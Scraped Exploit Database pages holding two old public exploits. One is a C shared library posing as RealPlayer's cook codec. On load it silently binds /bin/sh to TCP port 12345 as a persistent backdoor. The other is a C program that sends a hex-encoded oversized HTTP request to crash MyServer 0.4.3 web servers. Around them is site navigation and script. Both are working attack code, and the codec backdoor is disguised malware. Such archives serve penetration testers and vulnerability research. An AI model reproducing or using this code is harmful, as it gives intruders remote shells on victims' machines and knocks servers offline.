DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE*  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL*  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR*  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER*  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,*  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE*  USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.*****/#define PORT 12345#include <stdio.h>#include <signal.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <stdlib.h>void RAInitEncoder(void) { }/** This just happens to be one of the first* functions that realplayer calls after cook.so.6.0 is loaded*/void RAOpenCodec2(void) { cookthis(); }void RAOpenCodec(void) {  }void RAGetNumberOfFlavors(void) {  }void RACloseCodec(void) {  }void RADecode(void) {  }void RAEncode(void) {  }void RAFreeEncoder(void) {  }void RAGetNumberOfFlavors2(void) {  }void RAFreeDecoder(void) {  }void RAFlush(void) {  }void RAGetFlavorProperty(void) {  }void G2(void) { }void RASetFlavor(void) {  }void RAInitDecoder(void) {  }void RACreateEncoderInstance(void) { }/* Bind /bin/sh to PORT.  It forks* and all that good stuff, so it won't* easily go away.*/int cookthis() {int sock_des, sock_client, sock_recv, sock_len, server_pid, client_pid;struct sockaddr_in server_addr;struct sockaddr_in client_addr;if ((sock_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)exit(EXIT_FAILURE);bzero((char *) &server_addr, sizeof(server_addr));server_addr.sin_family = AF_INET;server_addr.sin_addr.s_addr = htonl(INADDR_ANY);server_addr.sin_port = htons(PORT);if ((sock_recv = bind(sock_des, (struct sockaddr *) &server_addr, sizeof(server_addr))) != 0)exit(EXIT_FAILURE);if (fork() != 0)exit(EXIT_SUCCESS);setpgrp();signal(SIGHUP, SIG_IGN);if (fork() != 0)exit(EXIT_SUCCESS);if ((sock_recv = listen(sock_des, 5)) != 0)exit(EXIT_SUCCESS);while (1) {sock_len = sizeof(client_addr);if ((sock_client = accept(sock_des, (struct sockaddr *) &client_addr, &sock_len)) < 0)exit(EXIT_SUCCESS);client_pid = getpid();server_pid = fork();if (server_pid != 0) {dup2(sock_client,0);dup2(sock_client,1);dup2(sock_client,2);execl("/bin/sh","realplay",(char *)0);close(sock_client);exit(EXIT_SUCCESS);}close(sock_client);}}// milw0rm.com [2003-09-09]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 94
MyServer 0.4.3 - Denial of Service - Multiple dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMyServer 0.4.3 - Denial of ServiceEDB-ID:94CVE:EDB Verified:Author:badpack3tType:dosExploit:/Platform:MultipleDate:2003-09-08Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* MyServer 0.4.3 DoS* vendor:* http://myserverweb.sourceforge.net** Written and found by badpack3t at security-protocols.com* For SP Research Labs* 09/08/2003** usage:* sp-myserv <targetip> [targetport] (default is 80)*/#include "stdafx.h"#include <winsock2.h>#include <stdio.h>#pragma comment(lib, "ws2_32.lib")char exploit[] =/* entire request */"\x47\x45\x54\x20\x2f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f""\x3f\x3f\x3f\x3f\x3f\x2e\x48\x54\x4d\x4c\x3f\x74\x65\x73\x74\x76""\x61\x72\x69\x61\x62\x6c\x65\x3d\x26\x6e\x65\x78\x74\x74\x65\x73""\x74\x76\x61\x72\x69\x61\x62\x6c\x65\x3d\x67\x69\x66\x20\x48\x54""\x54\x50\x2f\x31\x2e\x31\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20""\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74""\x2f\x62\x6f\x62\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70""\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78""\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63""\x6f\x64\x65\x64\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a""\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x0a\x43\x6f\x6f\x6b""\x69\x65\x3a\x20\x56\x41\x52\x49\x41\x42\x4c\x45\x3d\x53\x45\x43""\x55\x52\x49\x54\x59\x2d\x50\x52\x4f\x54\x4f\x43\x4f\x4c\x53\x3b""\x20\x70\x61\x74\x68\x3d\x2f\x0a\x55\x73\x65\x72\x2d\x41\x67\x65""\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x37\x36""\x20\x5b\x65\x6e\x5d\x20\x28\x58\x31\x31\x3b\x20\x55\x3b\x20\x4c""\x69\x6e\x75\x78\x20\x32\x2e\x34\x2e\x32\x2d\x32\x20\x69\x36\x38""\x36\x29\x0a\x56\x61\x72\x69\x61\x62\x6c\x65\x3a\x20\x72\x65\x73""\x75\x6c\x74\x0a\x48\x6f\x73\x74\x3a\x20\x6c\x6f\x63\x61\x6c\x68""\x6f\x73\x74\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x6c\x65\x6e\x67""\x74\x68\x3a\x20\x20\x20\x20\x20\x35\x31\x33\x0a\x41\x63\x63\x65""\x70\x74\x3a\x20\x69\x6d\x61\x67\x65\x2f\x67\x69\x66\x2c\x20\x69""\x6d\x61\x67\x65\x2f\x78\x2d\x78\x62\x69\x74\x6d\x61\x70\x2c\x20""\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67\x2c\x20\x69\x6d\x61\x67""\x65\x2f\x70\x6a\x70\x65\x67\x2c\x20\x69\x6d\x61\x67\x65\x2f\x70""\x6e\x67\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69""\x6e\x67\x3a\x20\x67\x7a\x69\x70\x0a\x41\x63\x63\x65\x70\x74\x2d""\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x0a\x41\x63\x63""\x65\x70\x74\x2d\x43\x68\x61\x72\x73\x65\x74\x3a\x20\x69\x73\x6f""\x2d\x38\x38\x35\x39\x2d\x31\x2c\x2a\x2c\x75\x74\x66\x2d\x38\x0a""\x0a\x0a\x77\x68\x61\x74\x79\x6f\x75\x74\x79\x70\x65\x64\x3d\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41""\x41\x41\x41\x0a\x0a\r\n";int main(int argc, char *argv[]){WSADATA wsaData;WORD wVersionRequested;struct hostent  *pTarget;struct sockaddr_in 	sock;char *target, buffer[30000];int port,bufsize;SOCKET mysocket;if (argc < 2){printf("MyServer 0.4.3 DoS by badpack3t\r\n <badpack3t@security-protocols.com>\r\n\r\n", argv[0]);printf("Usage:\r\n %s <targetip> [targetport] (default is 80)\r\n\r\n", argv[0]);printf("www.security-protocols.com\r\n\r\n", argv[0]);exit(1);}wVersionRequested = MAKEWORD(1, 1);if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;target = argv[1];port = 80;if (argc >= 3) port = atoi(argv[2]);bufsize = 1024;if (argc >= 4) bufsize = atoi(argv[3]);mysocket = socket(AF_INET, SOCK_STREAM, 0);if(mysocket==INVALID_SOCKET){printf("Socket error!\r\n");exit(1);}printf("Resolving Hostnames...\n");if ((pTarget = gethostbyname(target)) == NULL){printf("Resolve of %s failed\n", argv[1]);exit(1);}memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);sock.sin_family = AF_INET;sock.sin_port = htons((USHORT)port);printf("Connecting...\n");if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))){printf("Couldn't connect to host.\n");exit(1);}printf("Connected!...\n");printf("Sending Payload...\n");if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1){printf("Error Sending the Exploit Payload\r\n");closesocket(mysocket);exit(1);}printf("Remote Webserver has been DoS'ed \r\n");closesocket(mysocket);WSACleanup();return 0;}CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( 